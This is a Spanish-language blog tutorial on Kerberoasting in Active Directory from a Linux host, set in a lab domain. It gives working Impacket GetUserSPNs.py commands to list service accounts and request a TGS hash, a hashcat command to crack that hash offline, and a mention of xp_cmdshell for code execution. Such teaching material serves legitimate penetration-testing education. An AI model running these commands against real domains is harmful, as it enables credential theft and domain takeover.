---
title: Kerberoasting from a Linux Host
published: true
---


![Imagen_Kerberos](/assets/Kerberos.jpg)

# Kerberos

## ¿qué es Kerberos?:
Es una técnica de movimiento lateral / escalada de privilegios en el entorno de Directorio Activo. Tiene como objetivo la  cuentas “Service Principal Names”. Los SPN son identificadores únicos que utiliza kerberos para mapear un servicio en una cuenta de servicio en cuyo continente corre el servicio. Las cuentas de dominio suelen utilizarse para saltarse las limitaciones de autenticación de cuentas built-in como “NT AUTHORITY\LOCAL SERVICE”. Cualquier usuario de dominio puede solicitar un ticket kerberos para una cuenta de servicio del mismo dominio. Esto también está permitido entre árboles de dependencia en caso de que la autenticación esté permitida en el árbol de confianza. Lo único que necesitamos para realizar un ataque kerberoasting es una contraseña en texto claro ( o un hash NTLM), una shell en el contexto de un usuario de dominio o acceso a nivel de sistema a un host unido a dominio. Las cuentas de dominio que corren servicios son a menudo administradores locales, si no cuentas de altos privilegios de dominio. Debido a la naturaleza distribuida de los sistemas, interacción de servicios y transferencias de datos asociadas, las cuentas de servicio pueden ser ser administradores privilegiados en múltiples servidores a lo largo de la compañía. Muchos servicios requieren elevados privilegios en el sistema, por lo que las cuentas de servicio se suelen asociar a los grupos de privilegiados como Domain Admins. Es muy común encontrar con SPNs asociados a cuentas de privilegios elevados en un entorno Windows. Conseguir un ticket kerberos para una cuenta con SPN no significa per se que tengamos permiso para ejecutar comandos en el contexto de esta cuenta. Sin embargo el ticket TGS-REP está cifrado con el hash NTLM de la cuenta por lo que la contraseña en texto claro puede ser obtenida forzándolo a un ataque de fuerza bruta off-line.
Las cuentas de servicio suelen tener contraseñas débiles o reutilizadas para simplificar la tarea del administrador y en algunas ocasiones la contraseña es la misma que el nombre de usuario. Si la contraseña para una cuenta de dominio de SQL Service es craqueada, es probable que te puedas hacer administrador local en múltiples servidores o incluso el Domain Admin. Incluso si mediante kerberoasting conseguimos un ticket con un nivel de cuenta de usuario poco privilegiada, podemos utilizarla para solicitar tickets de servicio del servicio especificado en el SPN. Por ejemplo, si el SPN es de MSSQL/SRV01, podemos acceder al MSSQL como sys admin, habilitar xp_cmdshell extended procedure y obtener la capacidad de ejecución de código en el servidor SQL.
 

## A tener en cuenta durante el ataque:
Obtener un ticket TGS no te garantiza obtener una lista de credenciales válidas, el ticket debe ser crackeado off-line para obtener la contraseña en texto claro. Los tickets TGS llevan más tiempo de crackeo que otros tickets como los NTLM por lo que a menudo , a no ser que tenga una política débil de contraseñas puede resultar muy difícil o imposible crackear una contraseña con una plataforma normal de crackeo

## Desarrollo del ataque:
Los ataques de kerberoasting son fáciles de ejecutar con herramientas y scripts que lo automatizan. Podemos realizar estos ataques tanto desde un host linux como windows. Primero lo veremos desde un host Linux y de una manera semi-automatizada.

**Prerequisito**
Prerrequisitos: Una shell en un contexto de usuario de dominio o una cuenta como SYSTEM. Debemos saber también que host el Domain Controller.
Lo primero que necesitamos es el se de herramientas de Impacket.
```bash
sudo python3 -m pip install .
```

**Obtener lista de SPNs en el dominio**
Podemos obtener una lista de los SPNs presentes en el dominio. Para ello necesitaremos una lista de **credenciales válidas** y la **dirección del Domain Controller**. Podemos autenticarnos contra el Domain Controller con una contraseña en texto claro, un hash NTLM o un ticket Kerberos. Para nuestro caso utilizaremos el método de la contraseña. Con el siguiente comando podemos hacer un prompt de las credenciales y conseguir una lista de SPNs de una manera agradable. En el prompt de abajo podemos ver un ejemplo. Si podemos conseguir alguno de estos tickets y crackearlo podría llevar al compromiso del dominio. Es igualmente necesario que investiguemos todos los diferentes usuarios que aparecen porque no sabemos quien podría ser más fáciles de crackear.

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never> 
```

##Obtener el Ticket:
Una vez hemos visto los tickets que hay disponibles podemos hacer un request de cualquiera de ellos, aunque como ya hemos dicho sería necesario hacerlo de todos porque no sabemos quién podría tener una contraseña débil. 
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
Con el ticket final en nuestro poder solo tenemos que crackearlo en busca de la contraseña en texto plano, como este ejemplo es de un laboratorio sencillito la contraseña está dentro del diccionario "rockyou.txt". Para casos profesionales tendríamos que generar un diccionario personalizado, pero eso lo subiré en otro post.

##Crackeo del Ticket:
```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

```Python 
Happy Hacking
```

```Python 
bl4sdl3zo@proton.me
```
